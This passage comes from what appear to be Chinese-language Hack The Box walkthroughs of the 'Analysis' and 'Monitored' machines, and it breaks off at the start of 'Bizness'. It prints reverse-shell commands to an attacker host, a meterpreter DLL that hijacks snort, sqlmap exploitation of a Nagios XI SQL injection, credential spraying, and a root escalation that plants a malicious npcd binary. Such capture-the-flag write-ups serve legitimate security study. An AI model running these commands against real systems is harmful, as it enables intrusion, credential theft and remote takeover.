-echo; (stty size; cat) | nc -lvnp 5555\n```\n\n用python3开一个http服务\n\n```\npython3 -m http.server 80\n```\n\n然后执行\n\n```\nRunasCs.exe \"webservice\" \"N1G6G46G@G!j\" \"powershell.exe -c IEX(IWR -UseBasicParsing 'http://10.10.16.10/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp 10.10.16.10 -RemotePort 5555 -Rows 120 -Cols 38 -CommandLine cmd.exe\" -d \"analysis.htb\"\n```\n\n```\nMicrosoft Windows [version 10.0.17763.5329]\n(c) 2018 Microsoft Corporation. Tous droits réservés.\n\nC:\\Windows\\system32>whoami\nanalysis\\webservice\n\nC:\\Windows\\system32>hostname\nDC-ANALYSIS\n```\n\n成功获得webservice权限\n\n## user\n\n查看注册表，可以得到一个密码\n\n```\nC:\\Windows\\system32>reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n    AutoRestartShell    REG_DWORD    0x1\n    Background    REG_SZ    0 0 0\n    CachedLogonsCount    REG_SZ    10\n    DebugServerCommand    REG_SZ    no\n    DefaultDomainName    REG_SZ    analysis.htb.\n    DefaultUserName    REG_SZ    jdoe\n    DisableBackButton    REG_DWORD    0x1\n    EnableSIHostIntegration    REG_DWORD    0x1\n    ForceUnlockLogon    REG_DWORD    0x0\n    LegalNoticeCaption    REG_SZ\n    LegalNoticeText    REG_SZ\n    PasswordExpiryWarning    REG_DWORD    0x5\n    PowerdownAfterShutdown    REG_SZ    0\n    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}\n    ReportBootOk    REG_SZ    1\n    Shell    REG_SZ    explorer.exe\n    ShellCritical    REG_DWORD    0x0\n    ShellInfrastructure    REG_SZ    sihost.exe\n    SiHostCritical    REG_DWORD    0x0\n    SiHostReadyTimeOut    REG_DWORD    0x0\n    SiHostRestartCountLimit    REG_DWORD    0x0\n    SiHostRestartTimeGap    REG_DWORD    0x0\n    Userinit    REG_SZ    C:\\Windows\\system32\\userinit.exe,\n    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile\n    WinStationsDisabled    REG_SZ    0\n    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe\n    scremoveoption    REG_SZ    0\n    DisableCAD    REG_DWORD    0x1\n    LastLogOffEndTimePerfCounter    REG_QWORD    0x1ab910533\n    ShutdownFlags    REG_DWORD    0x13\n    DisableLockWorkstation    REG_DWORD    0x0\n    AutoAdminLogon    REG_SZ    1\n    DefaultPassword    REG_SZ    7y4Z4^*y9Zzj\n    AutoLogonSID    REG_SZ    S-1-5-21-916175351-3772503854-3498620144-1103\n    LastUsedUsername    REG_SZ    jdoe\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AlternateShells\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\GPExtensions\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\UserDefaults\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoLogonChecked\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\VolatileUserMgrKey\n```\n\n```\npassword = 7y4Z4^*y9Zzj\n```\n\n将我们之前kerbrute枚举出来的用户名保存下来，用crackmapexec进行验证\n\n```\n┌──(root㉿kali)-[~]\n└─# crackmapexec winrm 10.10.11.250 -u user.txt -p '7y4Z4^*y9Zzj'\nSMB         10.10.11.250    5985   DC-ANALYSIS      [*] Windows 10.0 Build 17763 (name:DC-ANALYSIS) (domain:analysis.htb)\nHTTP        10.10.11.250    5985   DC-ANALYSIS      [*] http://10.10.11.250:5985/wsman\nWINRM       10.10.11.250    5985   DC-ANALYSIS      [-] analysis.htb\\ajohnson:7y4Z4^*y9Zzj\nWINRM       10.10.11.250    5985   DC-ANALYSIS      [-] analysis.htb\\cwilliams:7y4Z4^*y9Zzj\nWINRM       10.10.11.250    5985   DC-ANALYSIS      [-] analysis.htb\\wsmith:7y4Z4^*y9Zzj\nWINRM       10.10.11.250    5985   DC-ANALYSIS      [-] analysis.htb\\jangel:7y4Z4^*y9Zzj\nWINRM       10.10.11.250    5985   DC-ANALYSIS      [-] analysis.htb\\technician:7y4Z4^*y9Zzj\nWINRM       10.10.11.250    5985   DC-ANALYSIS      [+] analysis.htb\\JDoe:7y4Z4^*y9Zzj (Pwn3d!)\n```\n\n然后去连接\n\n```\n┌──(root㉿kali)-[~]\n└─# evil-winrm -i 10.10.11.250 -u jdoe -p '7y4Z4^*y9Zzj'\n                                        \nEvil-WinRM shell v3.5\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\jdoe\\Documents> whoami\nanalysis\\jdoe\n```\n\n成功提权到 user\n\n```\n*Evil-WinRM* PS C:\\Users\\jdoe\\Desktop> type user.txt\n86e4a40890c7c6dc38234f462b9e23c0\n```\n\n成功拿到 user 权限的 flag 文件\n\n## Root\n\n```\n*Evil-WinRM* PS C:\\snort\\lib> icacls snort_dynamicpreprocessor\nsnort_dynamicpreprocessor AUTORITE NT\\SystŠme:(I)(OI)(CI)(F)\n                          BUILTIN\\Administrateurs:(I)(OI)(CI)(F)\n                          BUILTIN\\Utilisateurs:(I)(OI)(CI)(RX)\n                          BUILTIN\\Utilisateurs:(I)(CI)(AD)\n                          BUILTIN\\Utilisateurs:(I)(CI)(WD)\n                          CREATEUR PROPRIETAIRE:(I)(OI)(CI)(IO)(F)\n\nSuccessfully processed 1 files; Failed processing 0 files\n```\n\n在 C:\\snort\\lib 目录下使用 icacls 可以看到，`AUTORITE NT\\SystŠme` 用户拥有完全的控制权限\n\n经过搜索，发现 snort 是一个 IPS（开源入侵防御系统）设备，其中 Snort\\lib\\snort_dynamicpreprocessor 目录是增强 snort 软件使用的模块，也可以自定义模块，所以这里我们自己创建一个恶意的 dll 上传，替换掉其中的 sf_engine.dll 即可\n\n```\n┌──(root㉿kali)-[~]\n└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.10 LPORT=4444 -f dll -o sf_engine.dll\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of dll file: 9216 bytes\nSaved as: sf_engine.dll\n```\n\n```\n*Evil-WinRM* PS C:\\snort\\lib\\snort_dynamicpreprocessor> upload /root/sf_engine.dll\n                                        \nInfo: Uploading /root/sf_engine.dll to C:\\snort\\lib\\snort_dynamicpreprocessor\\sf_engine.dll\n                                        \nData: 12288 bytes of 12288 bytes copied\n                                        \nInfo: Upload successful!\n```\n\n```\n┌──(root㉿kali)-[~]\n└─# msfconsole                                                                                          \nMetasploit tip: Use the analyze command to suggest runnable modules for \nhosts\n                                                  \n ______________________________________\n/ it looks like you're trying to run a \\\n\\ module                               /\n --------------------------------------\n \\\n  \\\n     __\n    /  \\\n    |  |\n    @  @\n    |  |\n    || |/\n    || ||\n    |\\_/|\n    \\___/\n\n\n       =[ metasploit v6.3.43-dev                          ]\n+ -- --=[ 2376 exploits - 1232 auxiliary - 416 post       ]\n+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\nmsf6 > use multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set lhost 10.10.16.10\nlhost => 10.10.16.10\nmsf6 exploit(multi/handler) > set lport 4444\nlport => 4444\nmsf6 exploit(multi/handler) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.10:4444\n```\n\n然后等着就行\n\n```\nmsf6 exploit(multi/handler) > exploit\n\n[*] Started reverse TCP handler on 10.10.16.10:4444 \n[*] Sending stage (200774 bytes) to 10.10.11.250\n[*] Meterpreter session 1 opened (10.10.16.10:4444 -> 10.10.11.250:49323) at 2024-01-20 19:38:36\n\nmeterpreter > shell\nProcess 6980 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.17763.5329]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\nwhoami\nanalysis\\administrateur\n\nC:\\Windows\\system32>cd C:\\Users\\Administrateur\\Desktop\ncd C:\\Users\\Administrateur\\Desktop\n\nC:\\Users\\Administrateur\\Desktop>type root.txt\ntype root.txt\ndc980376fb1d18a0c7c6dc38234\n```\n\n","tags":["Hackthebox"]},{"title":"Monitored - Hackthebox","url":"/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/","content":"\n# 靶场信息\n\n![Monitored](Monitored-Hackthebox/Monitored.png)\n\n# 信息收集\n\n## Nmap\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sC -sV -A -p- --min-rate=10000 10.10.11.248\nStarting Nmap 7.93 ( https://nmap.org ) at 2024-01-16 15:56 CST\nNmap scan report for 10.10.11.248\nHost is up (0.084s latency).\nNot shown: 65530 closed tcp ports (reset)\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 61e2e7b41b5d46dc3b2f9138e66dc5ff (RSA)\n|   256 2973c5a58daa3f60a94aa3e59f675c93 (ECDSA)\n|_  256 6d7af9eb8e45c2026ad58d4db3a3376f (ED25519)\n80/tcp   open  http       Apache httpd 2.4.56\n|_http-title: Did not follow redirect to https://nagios.monitored.htb/\n|_http-server-header: Apache/2.4.56 (Debian)\n389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X\n443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))\n|_http-title: Nagios XI\n| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK\n| Not valid before: 2023-11-11T21:46:55\n|_Not valid after:  2297-08-25T21:46:55\n|_http-server-header: Apache/2.4.56 (Debian)\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\n5667/tcp open  tcpwrapped\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=1/16%OT=22%CT=1%CU=35962%PV=Y%DS=2%DC=T%G=Y%TM=65A636D\nOS:1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1\nOS:1NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 53/tcp)\nHOP RTT       ADDRESS\n1   132.11 ms 10.10.16.1\n2   83.83 ms  10.10.11.248\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 40.12 seconds\n```\n\n## Nmap UDP\n\nUDP的扫描结果过多，我会删除掉无用信息，大家有需要的可以自己扫描一次\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sC -sV -sU -T4 -Pn 10.10.11.248\nStarting Nmap 7.93 ( https://nmap.org ) at 2024-01-16 16:28 CST\nNmap scan report for nagios.monitored.htb (10.10.11.248)\nHost is up (0.081s latency).\nNot shown: 982 closed udp ports (port-unreach)\nPORT      STATE         SERVICE      VERSION\n68/udp    open|filtered dhcpc\n123/udp   open          ntp          NTP v4 (unsynchronized)\n| ntp-info: \n|_  \n161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)\n| snmp-processes:\n|   596: \n|     Name: sh\n|     Path: /bin/sh\n|     Params: -c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB \n|   622: \n|     Name: dhclient\n|     Path: /sbin/dhclient\n|     Params: -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0\n|   833: \n|     Path: /usr/bin/shellinaboxd\n|     Params: -q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit\n|   860: \n|     Path: /usr/lib/postgresql/13/bin/postgres\n|     Params: -D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf\n|   1408: \n|     Path: sudo\n|     Params: -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB\n|   1409: \n|     Path: /bin/bash\n|     Params: -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB\n| snmp-netstat: \n|   TCP  0.0.0.0:22           0.0.0.0:0\n|   TCP  0.0.0.0:389          0.0.0.0:0\n|   TCP  10.10.11.248:58046   10.10.16.18:9001\n|   TCP  127.0.0.1:25         0.0.0.0:0\n|   TCP  127.0.0.1:3306       0.0.0.0:0\n|   TCP  127.0.0.1:5432       0.0.0.0:0\n|   TCP  127.0.0.1:7878       0.0.0.0:0\n|   TCP  127.0.0.1:47254      127.0.1.1:80\n|   TCP  127.0.0.1:47268      127.0.1.1:80\n|   UDP  0.0.0.0:68           *:*\n|   UDP  0.0.0.0:123          *:*\n|   UDP  0.0.0.0:161          *:*\n|   UDP  0.0.0.0:162          *:*\n|   UDP  10.10.11.248:123     *:*\n|_  UDP  127.0.0.1:123        *:*\n162/udp   open          snmp         net-snmp; net-snmp SNMPv3 server\n| snmp-info: \n|   enterprise: net-snmp\n|   engineIDFormat: unknown\n|   engineIDData: 5a44ab2146ff4c6500000000\n|   snmpEngineBoots: 26\n|_  snmpEngineTime: 3h42m19s\nService Info: Host: monitored\n\nHost script results:\n|_clock-skew: 5s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1405.47 seconds\n```\n\n```\nsvc\nXjH7VCehowpR1xZB\n```\n\n似乎是一个账号密码\n\n## Http\n\n添加一个 hosts 解析\n\n```\necho \"10.10.11.248 nagios.monitored.htb monitored.htb\" >> /etc/hosts\n```\n\n![image-20240116160504272](Monitored-Hackthebox/image-20240116160504272.png)\n\n![image-20240116160516851](Monitored-Hackthebox/image-20240116160516851.png)\n\n这是一个Nagios XI，我们刚才在UDP的walk中得到了一个账号密码，去登录试试\n\n![image-20240116170623237](Monitored-Hackthebox/image-20240116170623237.png)\n\n提示账户已被禁用或不存在，目前没别的思路，所以我怀疑可能不是这个登录点，去扫个目录看看\n\n> https://support.nagios.com/forum/viewtopic.php?f=16&t=58783\n\n在官方论坛上面，我们得到了一个api路径`nagiosxi/api/v1/authenticate` \n\n# 漏洞利用\n\n去请求一下\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# curl -k https://nagios.monitored.htb/nagiosxi/api/v1/authenticate                                                                                  \n{\"error\":\"You can only use POST with authenticate.\"}\n```\n\n需要POST方式请求\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# curl -k -X POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate                                       \n{\"error\":\"Must be valid username and password.\"}\n```\n\nnice，这里让我们代入账号密码了\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# curl -k -X POST -d 'username=svc&password=XjH7VCehowpR1xZB' https://nagios.monitored.htb/nagiosxi/api/v1/authenticate\n{\"username\":\"svc\",\"user_id\":\"2\",\"auth_token\":\"245472399b3edb68e8ff0acfb94f058c21cf6fd8\",\"valid_min\":5,\"valid_until\":\"Fri, 19 Jan 2024 12:50:27 -0500\"}\n```\n\n得到了一个token\n\n```\n245472399b3edb68e8ff0acfb94f058c21cf6fd8\n```\n\n> https://support.nagios.com/forum/viewtopic.php?f=16&t=42923\n\n找到了一篇使用apikey来添加新用户的文章，但我们目前没有apikey，想想办法搞一个apikey\n\n> https://outpost24.com/blog/nagios-xi-vulnerabilities/?source=post_page-----cc2d7b64da35--------------------------------\n\n找到了一篇漏洞，CVE-2023-40933 一个sql注入\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# sqlmap -u \"https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=2&token=245472399b3edb68e8ff0acfb94f058c21cf6fd8\" --batch -p id --level 5 --risk 3 -D nagiosxi -T xi_users -C user_id,email,name,api_key --dump\n\nDatabase: nagiosxi\nTable: xi_users\n[14 entries]\n+---------+----------------------+------------------------+------------------------------------------------------------------+\n| user_id | name                 | email                  | api_key                                                          |\n+---------+----------------------+------------------------+------------------------------------------------------------------+\n| 1       | Nagios Administrator | admin@monitored.htb    | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL |\n| 2       | svc                  | svc@monitored.htb      | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK |\n| 6       | Amit R               | ar7@localhost          | KCo0kXK6f4R5774Iu6ADo9IsDWq4MsYr6bHGn98A3JPhUWoFdOSGm0P9XXeKdJJk |\n| 7       | test                 | test@localhost         | OMrovDTjdUO3fgtofjJ4f6GkLntOh0iBFtJDLidQpBN27aeKfihpIXneTCrbPkJ4 |\n| 8       | test                 | test@localhost         | UjEmNqRnca3YPaI3VYJ0rsBVTZqjdQSGOc5bHDgJvlpngEVlpPXUHstSGC9UOEQT |\n| 9       | test                 | test@localhost         | 3vlR5KpI3qn6dj99vqglaiZNfO55NgXHOvjhXf5lo2gKXcnGFGNX7PHYXN5IsVrD |\n| 10      | xxx                  | xxx@xxx.com            | v0OATXpVlabieTXlRZ4cPGjgRQtlGWOvoi98PdctWQpsAU2BBe0fWAIUm2MKIclh |\n| 12      | myadmin              | myadmin@localhost      | RBNeidWOeFjW6BTEDIBCi8v7Hkmq4bTKQEpcQGCImbKlvSWZ3aACFAZscNCOENNh |\n| 13      | xxx                  | xxx@xxx.com            | CPpCPuP2tp3QanriSSF27CH43OaS4bIqOs7LoX0h9oe33rN25UVcUr9GCB6gTuRn |\n| 14      | cyber                | cyber@localhost        | CRGet0kN9vSfXtglKejcdQsRSOqZZkdgYZG6hi2F5Hm948fC9dfsaHrfuq90Ue9S |\n| 15      | test                 | test@localhost         | lipOSdnvaogYouWA46uHUnQh639uMK5DE3OhfpJUGpjnn38P0jobIJbHBbJI0QVR |\n| 16      | tooltoulto           | tooltoulto@test.htb    | vlATLMas78mgMJNZXXtJE4H4aAbZtTbf9IYHXYHUkXW5Rqa3dYWECX8No3rBGF7s |\n| 17      | testadmin            | test@mail.com          | SZ6WBLotJYoV6XEVn2Aa6Z6ShWMFdLMLQf4GQbqoJSRYQdYYkmjjd2j808Lcm2Ek |\n| 18      | nadmin               | newadmin@monitored.htb | 67WPWGSBgCSVmXqN0e4GhQ9j2Jfnbcv4fDqN46H0uHYjaj5RZE40FJ06ZsubSl0L |\n+---------+----------------------+------------------------+------------------------------------------------------------------+\n```\n\n现在我们有了apikey了，接着去创建一个新用户\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# curl -X POST -k \"https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1\" -d \"username=Lucifiel&password=lucifiel123&name=Lucifiel&email=Lucifiel@htb.com&auth_level=admin\"\n{\n    \"success\": \"User account lucifiel was added successfully!\",\n    \"user_id\": 19\n}\n```\n\n创建成功，我们去登录一下\n\n![image-20240120022403314](Monitored-Hackthebox/image-20240120022403314.png)\n\n成功登录，接着依次点击 Configure -> Core Config Manager -> Commands -> Commands -> Add New，创建新命令\n\n```\nbash -c 'bash -i >& /dev/tcp/10.10.16.19/4444 0>&1'\n```\n\n![image-20240120023614692](Monitored-Hackthebox/image-20240120023614692.png)\n\n然后使用 nc 监听端口\n\n```\nnc -nvlp 4444\n```\n\n接着点击 Quick Tools -> Apply Configuration -> Apply Configuration 来应用我们的配置\n\n然后接着点击 Monitoring -> Server-> Add New-> Run Check Command\n\n![image-20240120023355180](Monitored-Hackthebox/image-20240120023355180.png)\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# rlwrap nc -nvlp 4444                             \nlistening on [any] 4444 ...\nconnect to [10.10.16.19] from (UNKNOWN) [10.10.11.248] 55738\nbash: cannot set terminal process group (100266): Inappropriate ioctl for device\nbash: no job control in this shell\nnagios@monitored:~$ whoami&&id\nwhoami&&id\nnagios\nuid=1001(nagios) gid=1001(nagios) groups=1001(nagios),1002(nagcmd)\n```\n\n成功获得 user 权限\n\n```\nnagios@monitored:~$ cat user.txt\ncat user.txt\ncf26b424c7a5d84a9c89b819e60a3468\n```\n\n成功获得 user 权限的 flag 文件\n\n# 权限提升\n\n使用 sudo -l 查看一下权限\n\n```\nnagios@monitored:~$ sudo -l\nsudo -l\nMatching Defaults entries for nagios on localhost:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser nagios may run the following commands on localhost:\n    (root) NOPASSWD: /etc/init.d/nagios start\n    (root) NOPASSWD: /etc/init.d/nagios stop\n    (root) NOPASSWD: /etc/init.d/nagios restart\n    (root) NOPASSWD: /etc/init.d/nagios reload\n    (root) NOPASSWD: /etc/init.d/nagios status\n    (root) NOPASSWD: /etc/init.d/nagios checkconfig\n    (root) NOPASSWD: /etc/init.d/npcd start\n    (root) NOPASSWD: /etc/init.d/npcd stop\n    (root) NOPASSWD: /etc/init.d/npcd restart\n    (root) NOPASSWD: /etc/init.d/npcd reload\n    (root) NOPASSWD: /etc/init.d/npcd status\n    (root) NOPASSWD: /usr/bin/php\n        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *\n    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *\n    (root) NOPASSWD: /usr/bin/php\n        /usr/local/nagiosxi/scripts/migrate/migrate.php *\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *\n    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *\n```\n\n```\nnagios@monitored:~$ ls -la /usr/local/nagiosxi/scripts/manage_services.sh\nls -la /usr/local/nagiosxi/scripts/manage_services.sh\n-r-xr-x--- 1 root nagios 3917 Nov  9 10:44 /usr/local/nagiosxi/scripts/manage_services.sh\n```\n\n这里我们有 npcd 的权限，同时还有 manager_services 的编辑执行权限，那直接把提权语句写入进去就可以了\n\n```\nnagios@monitored:~$ rm /usr/local/nagios/bin/npcd\nnagios@monitored:~$ vi /usr/local/nagios/bin/npcd\nnagios@monitored:~$ cat /usr/local/nagios/bin/npcd\n#!/bin/bash                                                                               bash -i >&/dev/tcp/10.10.16.19/5555 0>&1\nnagios@monitored:~$ cd /usr/local/nagios/bin\nnagios@monitored:/usr/local/nagios/bin$ chmod +x npcd\nnagios@monitored:/usr/local/nagios/bin$ sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd\n```\n\n然后去运行\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# nc -nvlp 5555                        \nlistening on [any] 5555 ...\nconnect to [10.10.16.19] from (UNKNOWN) [10.10.11.248] 34648\nbash: cannot set terminal process group (102596): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@monitored:/# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n成功获得 root 权限\n\n```\nroot@monitored:/# cat /root/root.txt\ncat /root/root.txt\n7a5e91f64064fc96d1fd5214e2856aeb\n```\n\n成功获得 root 权限的 flag 文件\n","tags":["Hackthebox"]},{"title":"Binzess - Hackthebox","url":"/2024/01/07/Hackthebox/Easy/Bizness-HackTheBox/","content":"\n# 靶场信息\n\n![image-20240107133231566](Bizness-HackTheBox/image-20240107133231566.png)\n\n# 信息收集\n\n## Nmap\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sC -sV -A -p- --min-rate=10000 10.10.11.252\nStarting Nmap 7.93 ( https://nmap.org ) at 2024-01-07 13:33 CST\nNmap scan report for 10.10.11.252\nHost is up (0.14s latency).\nNot shown: 65530 closed tcp ports (reset)\nPORT      STATE SERVICE    VERSION\n22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 3e21d5dc2e61eb8fa63b242ab71c05d3 (RSA)\n|   256 3911423f0c250008d72f1b51e0439d85 (ECDSA)\n|_  256 b06fa00a9edfb17a497886b23540ec95 (ED25519)\n80/tcp    open  http       nginx 1.18.0\n|_http-title: Did not follow redirect to https://bizness.htb/\n|_http-server-header: nginx/1.18.0\n443/tcp   open  ssl/http   nginx 1.18.0\n|_http-title: Did not follow redirect to https://bizness.htb/\n| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK\n| Not valid before: 2023-12-14T20:03:40\n|_Not valid after:  2328-11-10T20:03:40\n| tls-alpn: \n|_  http/1.1\n|_http-server-header: nginx/1.18.0\n|_ssl-date: TLS randomness does not represent time\n| tls-nextprotoneg: \n|_  http/1.1\n38289/tcp open  tcpwrapped\n46175/tcp open  tcpwrapped\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=1/7%OT=22%CT=1%CU=31273%PV=Y%DS=2%DC=T%G=Y%TM=659A37D3\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11\nOS:NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 995/tcp)\nHOP RTT       ADDRESS\n1   84.64 ms  10.10.16.1\n2   164.44 ms 10.10.11.252\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 46.67 seconds\n```\n\n```\necho 10.10.11.252 bizness.htb >> /etc/hosts\n```\n\n## Http\n\n![image-20240107133725633](Bizness-HackTheBox/image-20240107133725633.png)\n\n## Fuzz\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# ffuf -u 'https://bizness.htb/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fs 0        \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ 